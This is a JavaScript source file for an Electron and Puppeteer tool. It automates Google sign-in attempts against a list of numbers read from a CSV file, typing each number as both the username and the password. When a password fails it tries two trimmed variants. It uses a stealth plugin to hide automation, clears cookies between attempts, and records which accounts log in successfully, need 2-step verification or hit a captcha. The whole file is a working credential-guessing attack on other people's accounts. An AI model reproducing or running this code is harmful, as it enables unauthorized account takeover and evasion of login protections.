const custom_function = require('./custom_function');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())
var serialNumber = require('serial-number');
const cliSelect = require('cli-select');
const { app, BrowserWindow, ipcMain } = require("electron");
const save_output = require('./Save_ouput');
const axios = require('axios');
const waitforuser = require('wait-for-user-input');
const execSync = require('child_process').execSync;


function logger(status, message) {
    global.mainwin.webContents.send("logger", { status: status, message: message });
}

async function process(url, browser, email, password) {
    // await page.setExtraHTTPHeaders({
    //     'accept-language': 'en-US,en;q=0.9,hy;q=0.8'
    // });
    try {
        let page = await browser.newPage();
        await page.goto(url);
        await custom_function.sleep(200);

        await custom_function.loading(page, "//*[contains(text(),'Google')]");
        await page.type('input[type="email"]', email);
        // await console.log('email type complete');

        await page.click('button[jsname="LgbsSe"]');
        // await console.log('clicked!!!');
       
      
        await custom_function.sleep(350);
        let check_email_validaty = await custom_function.get_data(page, "//*[contains(text(),'অ্যাকাউন্ট খুঁজে পাওয়া যায়নি')]");
        if (check_email_validaty.length != 0) {
            await console.log('Ivalid Email Address');
            logger(1, 'Ivalid Email Address')
            await save_output.saveFile_stream(email, './data/invalid.txt')
            await page.close();
            await custom_function.sleep(200);
            return;
        }
     

        // await console.log('password');
        await custom_function.sleep(300);
        await custom_function.loading(page, '//input[@type="password"]', 'type');
        // await page.waitForSelector('input[type="password"]');
        await page.type('input[type="password"]', password);
        // await console.log('password type complete');
        await page.click('button[jsname="LgbsSe"]');

        let check_password_validaty = [];
        let i = 0;
        while (i < 2) {
            await custom_function.sleep(1000);
            check_password_validaty = await custom_function.get_data(page, "//*[contains(text(),'ভুল পাসওয়ার্ড')]");
            // captvha = await custom_function.get_data(page, "//*[contains(text(),'ভুল পাসওয়ার্ড')]");
            if (check_password_validaty.length != 0) {
                let new_pass = ' ';
                if (i == 0) {
                    new_pass = password.slice(0, -3);
                    await custom_function.sleep(250);
                    console.log(new_pass)
                } else {
                    new_pass = password.slice(3,);
                    await custom_function.sleep(250);
                    console.log(new_pass)
                }

                await console.log('New Password trying..... :', new_pass);
                logger(1, `'New Password trying..... : ' ${new_pass}`)
                await page.type('input[type="password"]', new_pass);
                await page.click('button[jsname="LgbsSe"]');
                custom_function.sleep(200);

            }
            await i++;
        }
        if (check_password_validaty.length != 0) {
            logger(1, 'Wrong Password')
            await console.log('Wrong Password');
            await save_output.saveFile_stream(email, './data/wrong_password.txt');
            await page.close();
            custom_function.sleep(200);
            return;
        }
        await custom_function.sleep(350);
        let pass_captcha = await custom_function.get_data(page, "//*[contains(text(),'সাইন-ইন করতে আরও উপায়')]");
        if (pass_captcha.length != 0) {
            const client = await page.target().createCDPSession();
            await client.send('Network.clearBrowserCookies');
            await client.send('Network.clearBrowserCache');
            await page.close()
            await custom_function.sleep(200);
            return;
        }

        await custom_function.loading(page, "//*[contains(text(),'আপনার যাচাইকরণ কোড সহ একটি পাঠ্য বার্তা পেতে একটি ফোন নম্বর লিখুন।')]");

        let two_step_verify_status =false

        let check_two_step = await custom_function.get_data(page, "//*[contains(text(),'আপনার যাচাইকরণ কোড সহ একটি পাঠ্য বার্তা পেতে একটি ফোন নম্বর লিখুন।')]");
        let check_two_step_1 = await custom_function.get_data(page, "//*[contains(text(),'আপনার ফোন পরীক্ষা করুন')]");
        let check_two_step_2 = await custom_function.get_data(page, "//*[contains(text(),'আপনি কীভাবে সাইন-ইন করতে চান বেছে নিন:')]");
        let check_two_step_3 = await custom_function.get_data(page, "//*[contains(text(),'নিজের পরিচয় যাচাই করুন')]");


        if(check_two_step.length != 0) {
            two_step_verify_status = true;
        }else if(check_two_step_1.length != 0){
            two_step_verify_status = true;
        }
        else if(check_two_step_2.length != 0){
            two_step_verify_status = true;
        } 
        else if(check_two_step_3.length != 0){
            two_step_verify_status = true;
        }

        if (two_step_verify_status === true) {
            logger(1, '2 step varification required')
            await console.log('2 step varification required');
            await save_output.saveFile_stream(email, './data/verification.txt');
            await page.close();
            await custom_function.sleep(200);
            return;
        }

        await custom_function.loading(page, (page, '//*[@id="captchaimg"]'), 2);

 
        let check_captcha_status = await custom_function.get_data(page, '//*[@id="captchaimg"]');
        if (check_captcha_status.length != 0) {
            await console.log('Sucessfully Complete!!!!!!!!');
            logger(1, 'Sucessfully Complete!!!!!!!!')
            await save_output.saveFile_stream(email, './data/captcha.txt');
            await page.close();
            await custom_function.sleep(200);
            return;
        }



        let check_data_status = false;
        
        if(await page.url().toString().includes('https://gds.google.com/web/chip')){
            check_data_status = true;
        }
        else if(await page.url().toString().includes('https://myaccount.google.com')){
            check_data_status = true;
        }
        else if(await page.url().toString().includes('https://accounts.google.com/signin/newfeatures?cbflow=signin&continue=https%3A%2F%2Faccounts.google.com%2FServiceLogin%3Fcontinue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252Fu%252F0%252F%26service%3Dmail%26hl%3Den%26authuser%3D0%26passive%3Dtrue%26sarp%3D1%26aodrpl%3D1%26checkedDomains%3Dyoutube%26checkConnection%3Dyoutube%253A394%253A0%26pstMsg%3D1%26osid%3D1&service=mail')){
            check_data_status = true;
        } 
        else if(await page.url().toString().includes('https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1')){
            check_data_status = true;
        }
      let check_login_status = await custom_function.get_data(page, '//*[@class="x7WrMb"]');
            if (check_login_status.length != 0) {
                check_data_status = true;
            }
        
        
        if (check_data_status ===  true) {
            await console.log('Login Statuse!!!!!!!!');
            await save_output.saveFile_stream(email, './data/success.txt');
            logger(1, 'Sucessfully Complete!!!!!!!!')
            const client = await page.target().createCDPSession();
            await client.send('Network.clearBrowserCookies');
            await client.send('Network.clearBrowserCache');
            await page.close()
            await custom_function.sleep(200);
            return;
        }
        logger(1, 'Ivalid Password')
        await console.log('Ivalid Password');
    } catch {


    }

}





async function start_index(headless) {
    logger(0, 'Process Started...');

    let email_credential_arr = await custom_function.read_csv('./data/email_credentail.csv');
    let ref = 15;
   
    await logger(0, 'browser opening..');
    const browsers = await puppeteer.launch({
        args: ['--incognito'],
        //product:'firefox',
         headless: headless == "0" ? false : true,
         
        executablePath: './chrome/chrome.exe'
        //  executablePath:firfoxPath
        
      

    });
    const browser = await browsers.createIncognitoBrowserContext();

        



    await custom_function.myForEach(email_credential_arr, async (elem, indx, arr) => {
     
try{
    
        
            try {
               
           

                let url = "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin";

                let email = elem.Email;
                New_email = email.toString();
                logger(1,New_email)
                if (New_email.startsWith('0') == false) {
                    New_email = '0' + email;
                }

                await process(url, browser, New_email, New_email);
                await save_output.saveFile_stream(New_email, "./Completed_List");
                logger(1, 'ALl Done!');

            } catch (e) {
                logger(0, 'Something wrong!!!!!!');
                await browser.reload();
            }

            if (indx == ref) {
                logger(0, 'Refreshing...');
                await custom_function.sleep(30000);
            }
        }

        catch(e){
            console.log(e,"error")
            logger(0, e);
        }
    }, email_credential_arr);
}
module.exports = start_index;